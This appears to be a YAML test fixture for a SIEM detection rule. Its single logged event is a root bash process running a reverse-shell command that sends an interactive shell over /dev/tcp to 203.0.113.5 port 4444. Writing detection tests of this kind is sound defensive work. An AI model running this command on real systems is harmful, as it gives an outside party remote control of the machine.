  log_format: syslog
  location: siem-procs
  events:
  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'

